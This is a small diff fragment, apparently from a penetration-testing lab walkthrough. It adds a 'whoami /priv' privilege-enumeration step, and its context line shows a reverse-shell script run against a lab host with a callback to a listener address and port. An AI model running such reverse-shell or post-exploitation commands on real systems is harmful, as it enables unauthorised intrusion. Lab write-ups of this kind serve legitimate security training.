@@ -148,5 +148,13 @@ root@pentestlab:~# python revshell.py 10.10.10.14 80 10.10.14.2 9999
 
 
 
+``` bash
+whoami /priv
+```
+
+
+
+
+
 
 
